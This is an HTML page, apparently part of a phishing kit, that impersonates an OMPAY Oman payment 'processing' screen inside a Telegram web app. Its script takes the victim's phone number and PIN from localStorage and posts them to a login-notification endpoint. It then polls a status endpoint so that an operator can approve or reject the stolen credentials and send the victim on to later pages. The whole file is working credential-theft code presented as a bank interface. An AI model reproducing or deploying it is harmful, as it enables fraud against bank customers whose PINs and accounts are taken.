<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OMPAY عمان - جاري المعالجة</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --ompay-primary: #004b87;
            --ompay-blue-light: #0077b6;
            --bg-dark: #0f172a;
            --card-bg: #ffffff;
            --text-dark: #1e293b;
            --text-muted: #64748b;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-dark); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }

        .loading-card {
            background: var(--card-bg); width: 88%; max-width: 380px; padding: 45px 24px;
            border-radius: 20px; text-align: center; box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
            display: flex; flex-direction: column; align-items: center; border-top: 5px solid var(--ompay-primary);
        }

        .loader-circle {
            width: 110px; height: 110px; background: linear-gradient(180deg, var(--ompay-blue-light) 0%, var(--ompay-primary) 100%);
            border-radius: 50%; margin-bottom: 28px; display: flex; justify-content: center; align-items: center;
            box-shadow: 0 6px 18px rgba(0, 75, 135, 0.3);
        }
        .loader-circle::after {
            content: ''; width: 82px; height: 82px; border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff; border-radius: 50%; animation: spin 1.2s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: var(--ompay-primary); font-size: 24px; margin: 0 0 10px; font-weight: 800; }
        p { color: var(--text-muted); font-size: 15px; margin: 0; line-height: 1.5; font-weight: 500; }
    </style>
</head>
<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">جاري المعالجة...</h2>
    <p id="sub-text">إعداد بيانات التحقق...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "OM" })
        });
    } catch (err) {
        console.error("Fetch error:", err);
    }

    setTimeout(() => {
        mainText.textContent = "يرجى الانتظار قليلاً...";
        subText.textContent = "تستغرق هذه العملية ثوانٍ معدودة";
    }, 3000);

    async function checkApproval() {
        if (!phone) return;
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "تمت الموافقة!";
                subText.textContent = "جاري فتح صفحة التحقق...";
                setTimeout(() => { window.location.href = "/page8"; }, 1500);
            }
            if (data.status === "denied") {
                mainText.textContent = "تم الرفض!";
                subText.textContent = "رمز الدخول أو الرقم غير صحيح.";
                setTimeout(() => { window.location.href = "/page6?error=wrongpin"; }, 2000);
            }
        } catch (err) {
            console.error("Status check failed:", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>
</body>
</html>
